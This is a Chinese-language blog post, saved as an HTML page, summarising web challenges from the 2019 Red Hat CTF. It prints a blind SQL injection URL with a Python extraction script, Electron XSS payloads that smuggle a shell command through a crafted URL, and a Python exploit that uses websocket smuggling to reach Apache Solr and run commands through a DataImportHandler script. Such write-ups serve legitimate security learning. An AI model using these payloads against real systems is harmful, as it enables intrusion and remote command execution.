@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言由于怎么题目没有做出了，因此总结的性质多一点。 0x01 easyweb存在sql注入，注入点：1/?s=/Api/Lt/gbooklist&amp;amp;orderby=if(ascii(substr((select%20flaag%20from%20fl4g),&amp;#123;&amp;#125;,1))=&amp;#123;&amp;#125;,sleep(6),1)%23  注入脚本123456789101112131">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 redhat ctf的Apache Solr构造回显">
+<meta property="og:url" content="http://yoursite.com/2019/11/24/2019-redhat-ctf的Apache-Solr构造回显/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言由于怎么题目没有做出了，因此总结的性质多一点。 0x01 easyweb存在sql注入，注入点：1/?s=/Api/Lt/gbooklist&amp;amp;orderby=if(ascii(substr((select%20flaag%20from%20fl4g),&amp;#123;&amp;#125;,1))=&amp;#123;&amp;#125;,sleep(6),1)%23  注入脚本123456789101112131">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-11-24T14:57:35.629Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 redhat ctf的Apache Solr构造回显">
+<meta name="twitter:description" content="前言由于怎么题目没有做出了，因此总结的性质多一点。 0x01 easyweb存在sql注入，注入点：1/?s=/Api/Lt/gbooklist&amp;amp;orderby=if(ascii(substr((select%20flaag%20from%20fl4g),&amp;#123;&amp;#125;,1))=&amp;#123;&amp;#125;,sleep(6),1)%23  注入脚本123456789101112131">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/24/2019-redhat-ctf的Apache-Solr构造回显/">
+
+
+
+
+
+  <title>2019 redhat ctf的Apache Solr构造回显 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/24/2019-redhat-ctf的Apache-Solr构造回显/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019 redhat ctf的Apache Solr构造回显</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-24T22:56:38+08:00">
+                2019-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于怎么题目没有做出了，因此总结的性质多一点。</p>
+<h5 id="0x01-easyweb"><a href="#0x01-easyweb" class="headerlink" title="0x01 easyweb"></a>0x01 easyweb</h5><h6 id="存在sql注入，注入点："><a href="#存在sql注入，注入点：" class="headerlink" title="存在sql注入，注入点："></a>存在sql注入，注入点：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=/Api/Lt/gbooklist&amp;orderby=if(ascii(substr((select%20flaag%20from%20fl4g),&#123;&#125;,1))=&#123;&#125;,sleep(6),1)%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">url = sys.argv[1]</span><br><span class="line">url = url.rstrip(&apos;/&apos;)</span><br><span class="line">url = url+&apos;?s=/Api/Lt/gbooklist&amp;orderby=if(ascii(substr((select flaag from fl4g),&#123;&#125;,1))=&#123;&#125;,sleep(6),1)%23&apos;</span><br><span class="line">for i in xrange(1,50):</span><br><span class="line">    for j in xrange(45,127):</span><br><span class="line">        try:</span><br><span class="line">            a = requests.get(url.format(i,j),timeout=3)</span><br><span class="line">        except:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure>
+
+<h5 id="0x02-Ticket—System"><a href="#0x02-Ticket—System" class="headerlink" title="0x02 Ticket—System"></a>0x02 <a href="https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&mid=2247484311&idx=1&sn=5d0276066554008c078e42114301095b&chksm=fd3c6933ca4be02567b7f6728013b042cd170b01b05ded7658c0c45262c2cb5a2603ee3e878e&mpshare=1&scene=23&srcid=&sharer_sharetime=1574242964867&sharer_shareid=3ae5a469f51aa53d58d49bba786993f6#rd" target="_blank" rel="noopener">Ticket—System</a></h5><h5 id="0x03-iCloudMusic"><a href="#0x03-iCloudMusic" class="headerlink" title="0x03 iCloudMusic"></a>0x03 iCloudMusic</h5><h6 id="1-首先寻找XSS-XSS的点很清晰就是js-to-run处的动态拼接js-header处用url-parse处理url"><a href="#1-首先寻找XSS-XSS的点很清晰就是js-to-run处的动态拼接js-header处用url-parse处理url" class="headerlink" title="1. 首先寻找XSS,XSS的点很清晰就是js_to_run处的动态拼接js,header处用url.parse处理url."></a>1. 首先寻找XSS,XSS的点很清晰就是<code>js_to_run</code>处的动态拼接js,header处用url.parse处理url.</h6><h6 id="2-fuzz所有unicode可以发现-uff07可以逃逸出单引号，因此只需要发送如下的url即可XSS"><a href="#2-fuzz所有unicode可以发现-uff07可以逃逸出单引号，因此只需要发送如下的url即可XSS" class="headerlink" title="2. fuzz所有unicode可以发现\uff07可以逃逸出单引号，因此只需要发送如下的url即可XSS."></a>2. fuzz所有unicode可以发现<code>\uff07</code>可以逃逸出单引号，因此只需要发送如下的url即可XSS.</h6><h6 id="3-查看源码可以发现main-js中拦截了new-window事件，如果openExternal失败后会执行命令打开url-然而electron的window-open-默认通过浏览器a标签来处理，因此这里有两个解题思路"><a href="#3-查看源码可以发现main-js中拦截了new-window事件，如果openExternal失败后会执行命令打开url-然而electron的window-open-默认通过浏览器a标签来处理，因此这里有两个解题思路" class="headerlink" title="3. 查看源码可以发现main.js中拦截了new-window事件，如果openExternal失败后会执行命令打开url,然而electron的window.open 默认通过浏览器a标签来处理，因此这里有两个解题思路:"></a>3. 查看源码可以发现main.js中拦截了new-window事件，如果openExternal失败后会执行命令打开url,然而electron的window.open 默认通过浏览器a标签来处理，因此这里有两个解题思路:</h6><h6 id="1-原形链污染覆盖a标签的getter"><a href="#1-原形链污染覆盖a标签的getter" class="headerlink" title="1) 原形链污染覆盖a标签的getter."></a>1) 原形链污染覆盖a标签的getter.</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">f.__proto__.__defineGetter__(<span class="string">'href'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="string">"http://xxxx.com＇%3B%00/?;$(open$IFS$9-a$IFS$9Calculator);#/asdasdasd%00%10"</span>&#125;);</span><br><span class="line"><span class="built_in">window</span>.open(<span class="string">'http://www.baidu.com'</span>);</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-用一个更宽的字节。"><a href="#2-用一个更宽的字节。" class="headerlink" title="2) 用一个更宽的字节。"></a>2) 用一个更宽的字节。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">"http://xxxx.com%EF%BC%87;%00?;$(open$IFS$9-a$IFS$9Calculator);#/asdasdasd%00%10"</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="0x04-Bank—service"><a href="#0x04-Bank—service" class="headerlink" title="0x04 Bank—service"></a>0x04 Bank—service</h5><h6 id="1-打开网页后，查看源码可发现通过socket-io建立socket连接与后端交互。"><a href="#1-打开网页后，查看源码可发现通过socket-io建立socket连接与后端交互。" class="headerlink" title="1. 打开网页后，查看源码可发现通过socket.io建立socket连接与后端交互。"></a>1. 打开网页后，查看源码可发现通过socket.io建立socket连接与后端交互。</h6><h6 id="2-交互提示后台使用solr提供搜索服务，联系websocket猜测可能是websocket-smuggle"><a href="#2-交互提示后台使用solr提供搜索服务，联系websocket猜测可能是websocket-smuggle" class="headerlink" title="2. 交互提示后台使用solr提供搜索服务，联系websocket猜测可能是websocket-smuggle"></a>2. 交互提示后台使用solr提供搜索服务，联系websocket猜测可能是websocket-smuggle</h6><h6 id="3-访问-solr提示403，于是⽤用websocket-smuggle访问发现可正常访问。"><a href="#3-访问-solr提示403，于是⽤用websocket-smuggle访问发现可正常访问。" class="headerlink" title="3. 访问/solr提示403，于是⽤用websocket-smuggle访问发现可正常访问。"></a>3. 访问/solr提示403，于是⽤用websocket-smuggle访问发现可正常访问。</h6><h6 id="4-尝试命令执行行，无法外带，只能构造回显，参考-https-paper-seebug-org-1009-，可以尝试利利用-ContentStreamDataSource-构造回显，seebug的paper中没有给出poc因此需要参考solr文档构造回显"><a href="#4-尝试命令执行行，无法外带，只能构造回显，参考-https-paper-seebug-org-1009-，可以尝试利利用-ContentStreamDataSource-构造回显，seebug的paper中没有给出poc因此需要参考solr文档构造回显" class="headerlink" title="4. 尝试命令执行行，无法外带，只能构造回显，参考 https://paper.seebug.org/1009/ ，可以尝试利利用 ContentStreamDataSource 构造回显，seebug的paper中没有给出poc因此需要参考solr文档构造回显"></a>4. 尝试命令执行行，无法外带，只能构造回显，参考 <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> ，可以尝试利利用 ContentStreamDataSource 构造回显，seebug的paper中没有给出poc因此需要参考solr文档构造回显</h6><h6 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">req1 = <span class="string">'''GET /socket.io/?transport=websocket HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:80</span></span><br><span class="line"><span class="string">Sec-WebSocket-Version: 1337</span></span><br><span class="line"><span class="string">Upgrade: websocket</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req2 = <span class="string">'''POST /solr/mail/dataimport?dataConfig=%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20/%3E%0A%3Cscript%3E%3C%21%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc%28row%29%7B%0A%20%20%20%20%20%20%20%20var%20j%3Dnew%20java.io.BufferedReader%28new%20java.io.InputStreamReader%28java.lang.Runtime.getRuntime%28%29.exec%28%22/readflag%22%29.getInputStream%28%29%29%29%3B%0A%20%20%20%20%20%20%20%20var%20line%3Dj.readLine%28%29%3B%0A%20%20%20%20%20%20%20%20var%20res%3D%22%22%3B%0A%20%20%20%20%20%20%20%20while%28line%21%3Dnull%20%26%26%20line%21%3Dundefined%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20res%3Dres%2Bline%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20line%3Dj.readLine%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%09%09row.put%28%22title_s%22%2Cres%29%3B%0A%09%09return%20row%3B%0A%09%7D%0A%20%20%5D%5D%3E%3C/script%3E%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22/books/book%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22res_s%22%20template%3D%22some%20static%20payload%22/%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title_s%22%20xpath%3D%22/books/book/name%22/%3E%0A%20%20%20%20%3C/entity%3E%0A%3C/document%3E%0A%3C/dataConfig%3E&amp;command=full-import&amp;debug=true HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:3000</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span></span><br><span class="line"><span class="string">Accept: application/json, text/plain, */*</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-type: application/xml</span></span><br><span class="line"><span class="string">X-Requested-With: XMLHttpRequest</span></span><br><span class="line"><span class="string">Content-Length: 135</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8983/solr/</span></span><br><span class="line"><span class="string">Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;books&gt;</span></span><br><span class="line"><span class="string"> &lt;book&gt;</span></span><br><span class="line"><span class="string"> &lt;name&gt;NAME1&lt;/name&gt;</span></span><br><span class="line"><span class="string"> &lt;/book&gt;</span></span><br><span class="line"><span class="string"> &lt;book&gt;</span></span><br><span class="line"><span class="string">&lt;name&gt;NAME2&lt;/name&gt;</span></span><br><span class="line"><span class="string">&lt;/book&gt;</span></span><br><span class="line"><span class="string">&lt;/books&gt;</span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(netloc)</span>:</span></span><br><span class="line">    host, port = netloc.split(<span class="string">':'</span>)</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, int(port)))</span><br><span class="line"></span><br><span class="line">    sock.sendall(req1)</span><br><span class="line">    data=sock.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+]connection finished'</span></span><br><span class="line">    <span class="keyword">print</span> req2</span><br><span class="line">    sock.sendall(req2)</span><br><span class="line">    data = sock.recv(<span class="number">409600</span>)</span><br><span class="line">    data = data.decode(errors=<span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">    <span class="comment">#sock.shutdown(socket.SHUT_RDWR)</span></span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">main(<span class="string">'127.0.0.1:3000'</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><h6 id="https-github-com-0ang3el-websocket-smuggle"><a href="#https-github-com-0ang3el-websocket-smuggle" class="headerlink" title="https://github.com/0ang3el/websocket-smuggle"></a><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank" rel="noopener">https://github.com/0ang3el/websocket-smuggle</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/24/Apache-Solr-Velocity模板注入RCE漏洞复现/" rel="next" title="Apache Solr Velocity模板注入RCE漏洞复现">
+                <i class="fa fa-chevron-left"></i> Apache Solr Velocity模板注入RCE漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-easyweb"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 easyweb</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#存在sql注入，注入点："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">存在sql注入，注入点：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注入脚本"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">注入脚本</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-Ticket—System"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x02 Ticket—System</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-iCloudMusic"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x03 iCloudMusic</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-首先寻找XSS-XSS的点很清晰就是js-to-run处的动态拼接js-header处用url-parse处理url"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">1. 首先寻找XSS,XSS的点很清晰就是js_to_run处的动态拼接js,header处用url.parse处理url.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-fuzz所有unicode可以发现-uff07可以逃逸出单引号，因此只需要发送如下的url即可XSS"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">2. fuzz所有unicode可以发现\uff07可以逃逸出单引号，因此只需要发送如下的url即可XSS.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-查看源码可以发现main-js中拦截了new-window事件，如果openExternal失败后会执行命令打开url-然而electron的window-open-默认通过浏览器a标签来处理，因此这里有两个解题思路"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">3. 查看源码可以发现main.js中拦截了new-window事件，如果openExternal失败后会执行命令打开url,然而electron的window.open 默认通过浏览器a标签来处理，因此这里有两个解题思路:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-原形链污染覆盖a标签的getter"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">1) 原形链污染覆盖a标签的getter.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-用一个更宽的字节。"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">2) 用一个更宽的字节。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x04-Bank—service"><span class="nav-number">1.0.4.</span> <span class="nav-text">0x04 Bank—service</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-打开网页后，查看源码可发现通过socket-io建立socket连接与后端交互。"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">1. 打开网页后，查看源码可发现通过socket.io建立socket连接与后端交互。</span></a></li><li class="nav-item 